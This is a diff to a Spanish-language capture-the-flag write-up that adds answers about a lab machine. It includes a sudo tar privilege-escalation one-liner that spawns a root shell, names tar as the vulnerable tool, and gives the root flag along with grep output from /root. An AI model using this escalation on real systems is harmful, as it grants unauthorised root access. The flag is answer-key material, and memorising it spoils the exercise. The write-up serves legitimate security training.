@@ -80,17 +80,36 @@ Por lo que el comando final para acceder a root estaría dado por:
 `sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`
 
 ## 1) ¿Qué pasa cuando se cambia de usuario?
-Re
+Se ejecuta la funcion `Interceptor de Sudo (Efecto Magic Word)` e imprime por pantalla: "AH AH AH! YOU DIDN'T SAY THE MAGIC WORD!"
 
 ---
 
 ## 2) ¿Qué herramienta es vulnerable?
-El 
+La herramienta vulnerable es tar, tal como se mostró anteriormente en el análisis de la vulnerabilidad.
 
 ---
 
 ## 3) ¿Cuál es la flag de root?
-El 
+La flag de root es YOU.C4N.D0.1T, obtenida a traves de `cat '/root/\r00t\'`
+
+Aunque, también se puede obtener mediante `grep -R "." /root 2>/dev/null`, esto debido a que analizando el formato de la FLAG previamente, ya que se encuentra en la página del ejercicio, se sabe que tiene un punto en su estructura, por lo que al conocer datos que podrían ser insignificantes, se puede realziar una busqueda para buscar formatos, en donde tenemos el resultado: 
+
+```bash
+/root/.profile:# ~/.profile: executed by Bourne-compatible login shells.
+/root/.profile:if [ "$BASH" ]; then
+/root/.profile:  if [ -f ~/.bashrc ]; then
+/root/.profile:    . ~/.bashrc
+/root/.profile:  fi
+/root/.profile:fi
+/root/.profile:mesg n || true
+/root/\r00t\:YOU.C4N.D0.1T
+/root/.bashrc:# ~/.bashrc: executed by bash(1) for non-login shells.
+/root/.bashrc:# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+/root/.bashrc:# for examples
+....
+....
+```
+Aunque cabe aclarar que realizar una busqueda utilziando solamente un elemento tán común como un punto, puede llevar a una lista inmensa de resultados y en la mayoría de los casos, resultar poco práctico.
 
 ---
 
